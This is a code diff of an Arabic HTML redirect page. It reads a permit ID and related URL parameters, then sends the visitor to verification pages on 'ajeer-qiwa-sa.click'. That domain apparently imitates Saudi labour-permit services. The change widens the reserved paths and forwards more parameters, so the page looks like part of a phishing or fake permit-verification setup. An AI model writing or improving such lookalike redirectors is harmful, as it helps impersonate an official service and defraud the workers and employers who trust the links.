@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -7,30 +8,74 @@
 </head>
 <body>
   <p id="message">جاري فتح صفحة التحقق...</p>
+
   <script>
   (function () {
     "use strict";
+
     const params = new URLSearchParams(location.search);
     const parts = location.pathname.split("/").filter(Boolean);
-    const last = parts[parts.length - 1] || "";
-    const reserved = ["index.html", "404.html", "view", "verify.htm", "verify.html", "add-verify.html"];
-    const id = (params.get("id") || (!reserved.includes(last) ? last : "")).trim();
-    if (!id) {
+
+    const reserved = [
+      "index.html",
+      "404.html",
+      "view",
+      "verify.htm",
+      "verify.html",
+      "add-verify.html",
+      "blocked.html",
+      "add",
+      "blocked"
+    ];
+
+    const last = decodeURIComponent(
+      parts[parts.length - 1] || ""
+    );
+
+    const id = (
+      params.get("id") ||
+      (!reserved.includes(last.toLowerCase()) ? last : "")
+    ).trim();
+
+    const num = (params.get("num") || "").trim();
+    const ref = (params.get("ref") || "").trim();
+    const type = (params.get("type") || "").trim().toLowerCase();
+
+    if (!id && !num) {
       document.getElementById("message").textContent =
         "رابط التحقق غير مكتمل: رقم التصريح غير موجود.";
       return;
     }
-    const type = (params.get("type") || "").trim().toLowerCase();
-    const additional = ["add", "additional", "extra"].includes(type) ||
-      /\/add-verify\.html?$/.test(location.pathname);
-    const blocked = type === "blocked";
-    const page = blocked ? "blocked.html" : (additional ? "add-verify.html" : "verify.html");
-    const target = new URL("https://ajeer-qiwa-sa.click/ajeer/" + page);
-    target.searchParams.set("id", id);
-    ["num", "ref", "type", "gender"].forEach(function (key) {
+
+    const path = location.pathname.toLowerCase();
+
+    const additional =
+      ["add", "additional", "extra"].includes(type) ||
+      /\/add(?:-verify\.html?)?\/?$/.test(path);
+
+    const blocked =
+      type === "blocked" ||
+      /\/blocked(?:\.html?)?\/?$/.test(path);
+
+    const page = blocked
+      ? "blocked.html"
+      : additional
+        ? "add-verify.html"
+        : "verify.html";
+
+    const target = new URL(
+      "https://ajeer-qiwa-sa.click/ajeer/" + page
+    );
+
+    if (id) target.searchParams.set("id", id);
+    if (num) target.searchParams.set("num", num);
+    if (ref) target.searchParams.set("ref", ref);
+
+    ["type", "gender"].forEach(function (key) {
       const value = params.get(key);
-      if (value !== null && value !== "") target.searchParams.set(key, value);
+      if (value) target.searchParams.set(key, value);
     });
+
     location.replace(target.toString());
   })();
   </script>
